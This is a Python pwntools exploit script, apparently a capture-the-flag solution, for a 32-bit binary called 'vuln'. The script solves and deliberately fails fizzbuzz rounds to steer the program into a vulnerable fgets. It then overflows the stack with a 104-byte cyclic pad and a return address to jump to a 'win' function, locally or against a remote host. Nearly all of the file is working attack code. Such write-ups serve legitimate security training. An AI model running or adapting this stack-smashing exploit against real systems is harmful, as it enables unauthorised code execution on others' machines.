#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template vuln
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.HOST and args.PORT:
        return remote(args.HOST, args.PORT, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x8048000)

RIP_DIST = 104 # cyclic -l 0x62616162
WIN = 0x08048656

def solve_fizz_buzz(num):
    out = ''

    if num % 3 == 0:
        out += 'fizz'

    if num % 5 == 0:
        out += 'buzz'

    if out == '':
        out = str(num)

    return out.encode('latin1')


log.info("""the bulk of this challenge is finding the vulnerable fgets then navigating how to get to it.

first, you need to solve 35 fizzbuzz problems.

then, you need to set the return value of fizzbuzz() to specific values by intentionally failing after x number of solves

then you need to do that again to hit the vulnerable fgets

then its a fairly easy stack smash and ret2win""")

io = start()

#pause()

log.info("solving the first chunk of 35 'correct' fizzbuzz iterations")
# 35 found using a clever breakpoint and a while True
count = 1
text = io.readuntil(b"?")
num = int(re.search(rb"(\d+)\?$", text.strip()).group(1))
while count < 36:
    io.sendline(solve_fizz_buzz(num))
    text = io.readuntil(b"?")
    num = int(re.search(rb"(\d+)\?$", text.strip()).group(1))
    if num == 1:
        count += 1

#pause()

log.info("now we'll alternate wins and losses to get to the blocks we want")
log.info("going to ptr_to_ptr_to_ptr_to_overflow...")
io.sendline(solve_fizz_buzz(0)) # always fail
io.readuntil(b"?")
count = 0
while count < 8:
    io.sendline(solve_fizz_buzz(1))
    text = io.readuntil(b"?")
    num = int(re.search(rb"(\d+)\?$", text.strip()).group(1))
    while num != 1:
        io.sendline(solve_fizz_buzz(num))
        text = io.readuntil(b"?")
        num = int(re.search(rb"(\d+)\?$", text.strip()).group(1))
    io.sendline(solve_fizz_buzz(0)) # always fail
    io.readuntil(b"?")
    count +=1

#pause()

io.sendline(solve_fizz_buzz(0)) # always fail
io.readuntil(b"?")

log.info("ok time to get to ptr_to_ptr_to_overflow...more alternating...")
count = 0
while count < 1:
    io.sendline(solve_fizz_buzz(1))
    text = io.readuntil(b"?")
    num = int(re.search(rb"(\d+)\?$", text.strip()).group(1))
    while num != 1:
        io.sendline(solve_fizz_buzz(num))
        text = io.readuntil(b"?")
        num = int(re.search(rb"(\d+)\?$", text.strip()).group(1))
    count +=1
    io.sendline(solve_fizz_buzz(0)) # always fail
    io.readuntil(b"?")

io.sendline(solve_fizz_buzz(0)) # always fail
io.readuntil(b"?")

log.info("ok time to get to ptr_to_overflow (more alternating)...")
count = 0
while count < 22:
    io.sendline(solve_fizz_buzz(1))
    text = io.readuntil(b"?")
    num = int(re.search(rb"(\d+)\?$", text.strip()).group(1))
    while num != 1:
        io.sendline(solve_fizz_buzz(num))
        text = io.readuntil(b"?")
        num = int(re.search(rb"(\d+)\?$", text.strip()).group(1))
    count +=1
    io.sendline(solve_fizz_buzz(0)) # always fail
    io.readuntil(b"?")

log.info("triggering overflow function now....only one more step...")
io.sendline(solve_fizz_buzz(1))
io.sendline(solve_fizz_buzz(2))
io.sendline(solve_fizz_buzz(3))
io.sendline(solve_fizz_buzz(4))
io.sendline(solve_fizz_buzz(0)) # local_10 == 5 to trigger

log.info("failing on final fizzbuzz to get to overflow fgets...")
io.send(solve_fizz_buzz(0)) # local_10 == 1 to trigger

log.info("smashing the stack....")
io.sendline(cyclic(RIP_DIST) + p32(WIN))

io.interactive()
